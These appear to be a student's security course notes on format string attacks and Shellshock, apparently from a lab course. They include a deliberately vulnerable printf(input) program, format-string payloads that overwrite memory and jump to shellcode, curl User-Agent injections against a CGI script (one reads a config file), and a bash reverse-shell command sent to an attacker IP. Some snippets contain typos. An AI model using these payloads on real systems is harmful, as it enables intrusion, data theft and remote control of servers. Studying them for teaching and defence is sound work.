# Week 4 Format String Attack and Shellshock Attack
## Directory
- [Home](/README.md#table-of-contents)
- [Week 3 Race Condition Attacks and "Dirty Cow"](/week3/README.md#Week-3-race-condition-attacks-and-dirty-cow)
- **&rarr;[Week 4 Format String Attack and Shellshot Attack](/week4/README.md#week-4-format-string-attack-and-shellshock-attack)**
- [Week 5 The Web Technologies and Cross-Site Request Forgery Attack](/week5/README.md#week-5-the-web-technologies-and-cross-site-request-forgery-attack)

## 4.2 Part 1: Format String Attack
([top](#directory))
- exploit some of the format string problems
- how format string works
- what we can do

## 4.3 How Format String Works
([top](#directory))

```c
#include <stdio.h>

int main(){
    int i=1, j=2, k=3;

    printf("Hello World\n");
    printf("Print one number : %d\n", i);
    printf("Print two numbers : %d, %d\n", i, j);
    printf("Print three numbers : %d, %d, %d\n", i, j, k);
}
```

```c
int printf(const char *format, ...);
```

### Function with Varying Length of Arguments

```c
#include <stdio.h>
#include <stdarg.h>

int myprint(int Narg, ...){
    va_list ap;
    int i;

    va_start(ap,Narg);

    for(i=0;i<Narg;i++){
        //print optional argument of type int
        printf("%d ", va_arg(ap, int));
        //print optional argument of type double
        printf("%f ", va_arg(ap, double));
    }
    printf("\n");

    va_end(ap);
}

int main(){
    myprint(1,2,3.5);
    myprint(2,3,4.5,4,5.5);
}
```

||stack||
|-|-|-|
|...|...|...|
|8bytes`ap`&#8625;|3.5|&larr;`Narg`|
|4bytes`ap`&#8625;|2|&larr;`Narg`|
|4bytes`ap`&#8625;|1|&larr;`Narg`|



### How printf() Access Optional Arguments
```c
#include <stdio.h>

int main(){
    int id=100, age=25, char*name="Bob Smith";
    pritnf("\n ID: %d, Name: %s, Age: %d\n",id,name,age);
}
```

#### How format string works

```c
int __printf (const char *format,...){
    va_list arg;
    int done;

    va_start (arg,format);
    done=vfprintf (stdout, format, arg);
    va_end (arg);
    
    return done;
}
```

## 4.4 Format String Vulnerability
([top](#directory))

### printf with missing arguments

```c
#include <stdio.h>

int main(){

    int id=100, age=25; char *name = "Bruce Smith";
    printf("ID: %d, Name: %s, Age: %d\n", id, name);
    return 0;
}
```

||stack||
|-|-|-|
|`ap`&#8625;|///||
|`ap`&#8625;|///|printf|
|`ap`&#8625;|&rarr;"Bruce Smith"|printf|
|`ap`&#8625;|100|printf|
||||

### Untrusted User Input Becomes Format String
Example 1
```c
printf(user_input);
```

Example 2
```C
sprintf(format, "%s %s", user_input, ":%d");
printf(format, program_data);
```

Example 3

```c
sprintf(format, "%s %s",getenv("PWD"), ":%d");
printf(format, program_data);
```

### A Vulnerable Program

```C
#include <stdio.h>

void fmtstr(){

    char input[100];

    printf("please enter a string: ");
    fgets(input, sizeof(input)-1,stdin);

    printf(input);
}

int main(int argc, char *argv[]){
    fmtstr();
    return 0;
}
```

#### Crash the Program

||||
|-|-|-|
||||
|`ap`&#8625;|||
|`ap`&#8625;|||
|`ap`&#8625;|`input`&rarr;|"%d%d%d", use "%s%s%s"|

#### Print out Secret Value

Question: How do you print out some secret value stored on the stack

||stack||
|-|-|-|
||secret||
|`ap`&#8625;|20bytes||
|`ap`&#8625;||%d%d%d%d%d...|


#### Print Out Secret Message at Specific Address

Question: how do you print out some secret value stored at address `0xaabbccdd`?


||||
|-|-|-|
||%s||
||%d%d%d%d%d||
||`0xaabbccdd`||
|`ap`&#8625;|||
|`ap`&#8625;|input||

find distance between initial `ap` and `0xaabbccdd`

## 4.5 Attack Via Memory Modification
([top](#directory)
### Modify Memory at Specific Address

question: how do you change the data stored at address 0xbffff304 with some value (any value is fine)?

```C
int main(){
    int count = 0;
    printf("hello%n", &count);
    // count = 5
}
```

|||
|-|-|
||`%n`|
||`%d%d%d%d%d`|
||`0xbffff304`|
|`ap`&#8625;||
|...|20byte|
|`ap`&#8625;|input|

### Modify Memory with Specific Value (Approach 1)
Question: how do you modify the data stored at address 0xbffff304 with value 0x66887799

#### Precision width modifiers

```c
printf("%.5d",10);//00010
printf("%5d"10);// ___10

```

|||
|-|-|
||`%.8d%.8d%.8d%.8d%.{0x66887799-36}d%n`|
||0xbffff304|

- target address is 4 bytes
- %.8d is 8 bytes x 4 = 32 bytes
- 36 total bytes

### modify memory with specific value (approach 2, much faster)

#### length modifiers for %n

```c
#include <stdio.h>
void main(){
    int a, b, c;
    a = b = c= 0x11223344;

    printf("12345%n\n",&a);
    printf("the value of a: 0x%x\n",a);//0x00000005
    printf("12345%hn\n",&b);
    printf("the value of b: 0x%x\n",b);//0x11220005
    printf("12345%hhn\n",&c);
    printf("the value of c: 0x%x\n",c);//0x11223305
}
```

## 4.6 Code Injection
([top](#directory)
Question how to use format string vulnerability to jump to injected shellcode?

||stack||
|-|-|-|
|`0xbffff38c`&rarr;|`Return address`|modify this pointer to shellcode|
||||
|`0xbffff358`&rarr;|`shell code`||
||`_%.13144x%hn`||
||`_%.49102x%hn`|1+49102|
||`_%.8_%.8_%.8_%.8`|36|
||`0xbffff38c`|4|
|`ap`&rarr;|`@@@@`|4|
|`ap`&rarr;|`0xbffff38e`|4|
||||
|`ap`&rarr;|`input(format string)`||

## 4.8 Summary
([top](#directory)
- How format string works
- Format string vulnerability
- exploiting the vulnerability
  - crash program
  - steal secret
  - modify data
  - code injection

## 4.9 Part 2 Shellshock Attack
([top](#directory)
- september 24, 2014
- vulnerability in bash
- related to:
  - env variables
  - CGI and web

## 4.10 Shellshock Vulnerability
([top](#directory)
### defining functions in shell

```
$ foo() {echo "inside function";}
$ declare -f foo
foo ()
{
    echo "inside function"
}
$ foo
inside function
```

### Passing function to child process

#### Passing function definition explicitly
```
$ foo() {echo "hello wolrd";}
$ declare -f foo
foo(){
    echo "hello world"
}
$ bash # child shell
(child)$ delcare -f foo
(child$ foo
hello world
```

#### passing function definition via shell variable
```
$ foo='(){"helo world";}' #shell variable
$ echo $foo
() {"hello world";}
$ declare -f foo
$ export foo
$ bash
(child)$ echo $foo

(child)$ declare -f foo #bash parses env var to function
foo()
{
    echo "hello world"
}
(child)$ foo
hello world
```

### Shellshock Vulnerability
```
$ foo='(){echo "hello world";}; echo "extra";'
$ echo $foo
(){echo "hello world";}; echo "extra";
$ export foo
$
$ bash
extra
(child)$ echo $foo

(child)$ declare -f foo
foo()
{
    echo "hello world"
}
(child)$
```

### mistake in source code

bash runs `parse_and_execute`. so after the semicolon `;` the rest is executed upon parsing.

## 4.11 Exploiting Shellshock Vulnerability
([top](#directory)
- Execute a bash shell
  - process environment variables containing function definition
- trigger environment parsing logic
- shellshock

### Shellshock Attack on CGI: How CGI Works

- browser
  - apache server
    - serves static content
    - or
    - fork() child process
      - cgi
        - shell script
        - `#!/bin/bash`

### Passing Envrionment Variables to CGI
#### CGI Program
```
echo "content type : text/plain"
echo
echo "*** Environment Variables***"
strings /proc/$$/environ
```

### From Command Line

```
$ curl -A "() {echo hello;}" http://localhost/cgi-bin/test.cgi
```

### Run a command on the Server

```
$ curl -A "(){echo hello;}; echo Content_type: text/plain; echo; /bin/ls -l" http://localhost/cgi-bin/test.cgi"
```

```
$ curl -A "(){echo hello;}; echo Content_type: text/plain; echo; /bin/cat /var/www/SQL/Collabtive/config/standard/config.php" http://localhost/cgi-bin/test.cgi"
```

## 4.12 Reverse Shell
([top](#directory)

### What command to inject: Reverse Shell

- attacker
  - `netcat` server (tcp)
    - 0
    - 1
    - 2

- &#8597; tcp connection 

- server
  - `/bin/bash`
    - stdin: 0
    - stdout: 1
    - stder: 3
  - redirect
    - 0: input from tcp connection
    - 1: use tcp connection
    - 2: use tcp connection


## 4.13 Demo: Reverse Shell

- Attacker
  - `nc -l 9090 -v`
- Server
  - `/bin/bash -i > /dev/tcp/10.0.2.7/9090 2>&1 0<&1`